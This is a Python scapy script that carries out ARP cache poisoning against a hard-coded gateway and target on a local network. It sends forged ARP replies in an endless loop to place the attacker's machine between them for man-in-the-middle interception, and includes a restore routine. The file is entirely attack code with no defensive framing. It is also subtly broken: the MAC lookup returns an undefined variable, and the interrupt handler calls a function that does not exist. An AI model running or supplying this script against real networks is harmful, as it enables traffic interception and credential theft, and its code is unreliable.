from scapy.all import *

interface = "en0"
gateway_ip = "192.168.1.2"
target_ip = "192.168.1.103"
broadcastMac = "ff:ff:ff:ff:ff:ff"
packet_count = 50

conf.verb = 0


def getMac(IP):
    ans, unans = srp(Ether(dst=broadcastMac)/ARP(pdst = IP), timeout =2, iface=interface, inter=0.1)

    for send,recive in ans: 
        return r[Ether].src
    return None

try:
    gateway_mac = getMac(gateway_ip)
    print ("Gateway MAC :" + gateway_mac)
except:
    print ("Failed to get gateway MAC. Exiting.")
    sys.exit(0)
try:
    target_mac = getMac(target_ip)
    print ("Target MAC :" + target_mac)
except:
    print ("Failed to get target MAC. Exiting.")
    sys.exit(0)




def poison(gateway_ip,gateway_mac,target_ip,target_mac):

    targetPacket = ARP()
    targetPacket.op = 2
    targetPacket.psrc = gateway_ip
    targetPacket.pdst = target_ip
    targetPacket.hwdst= target_mac

    gatewayPacket = ARP()
    gatewayPacket.op = 2
    gatewayPacket.psrc = target_ip
    gatewayPacket.pdst = gateway_ip
    gatewayPacket.hwdst= gateway_mac

    while True:
        try:
            targetPacket.show()
            send(targetPacket)
            gatewayPacket.show()
            send(gatewayPacket)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            sys.exit(0)
    sys.exit(0)
    return

def restore(gateway_ip,gateway_mac,target_ip,target_mac):
    print("Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=100)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=100)
    print("[Target Restored...")
    sys.exit(0)


try:
    poison(gateway_ip, gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    restore(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)
